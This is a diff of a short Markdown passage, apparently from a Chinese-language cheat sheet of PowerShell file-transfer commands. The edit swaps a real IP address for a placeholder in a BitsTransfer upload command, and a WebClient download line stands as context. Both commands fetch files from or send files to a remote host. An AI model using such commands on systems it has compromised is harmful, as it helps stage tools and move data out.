@@ -20,7 +20,7 @@ powershell (new-object System.Net.WebClient).DownloadFile( 'http://www.xx.com/ff
 ### 多行
 ```
 Import-Module BitsTransfer
-Start-BitsTransfer -Source file.rar -Destination http://202.182.103.240/upload/file.rar -transfertype upload
+Start-BitsTransfer -Source file.rar -Destination http://xx.xx.xx.xx/upload/file.rar -transfertype upload
 ```
 ### 一句话
 ```
